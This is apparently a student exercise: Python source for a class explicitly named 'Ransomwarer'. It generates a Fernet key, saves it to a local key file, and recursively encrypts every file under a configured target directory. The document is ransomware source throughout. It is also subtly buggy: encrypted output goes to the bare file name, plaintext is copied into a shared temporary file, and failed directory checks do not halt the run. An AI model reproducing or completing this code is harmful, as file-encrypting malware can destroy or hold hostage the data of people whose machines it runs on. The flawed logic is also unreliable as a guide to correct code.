import constants
import os
from pathlib import Path
from cryptography.fernet import Fernet



class Ransomwarer():
    def __init__(self, argv = None):
        self.args = argv
        self.target_dir_path = constants.TARGET_DIR
        self.target_directory = Path(self.target_dir_path)
        key = Fernet.generate_key()
        with open("stokholm.key", "wb") as key_file:
            key_file.write(key)
        self.fernet = Fernet(key=key)
        self.count = 0


    def __open_target_directory(self, dir : Path):
        if dir.exists() is False:
            print(f"\033[3;91m"+ f"{dir} not found" + "\033[3;39m")
            return
        if not os.access(dir, os.R_OK | os.X_OK):
            print(f"\033[3;91mCannot read/list from {dir}, you need permissions\033[3;39m")
            return
        if not self.target_directory.is_dir():
            print(f"\033[3;91m"+ f"{dir} is not a directory" + "\033[3;39m")
    

    def __encrypt_file_helper(self, file : Path):
        with file.open("rb") as f:
            content = f.read()
            with open("temporary_file", "wb") as w_f:
                w_f.write(content)
        encrypted_content = self.fernet.encrypt(content)
        with open(file.name, "wb") as f:
            f.write(encrypted_content)

    def __encrypting_files(self, dir : Path):
        self.__open_target_directory(dir)
        for item in dir.iterdir():
            self.count += 1
            if item.is_file():
                self.__encrypt_file_helper(item)
                print("is file")
            elif item.is_dir():
                self.__encrypting_files(item)

            
    def execute(self):
        print("to execute")
        self.__encrypting_files(self.target_directory)
        print(self.count)
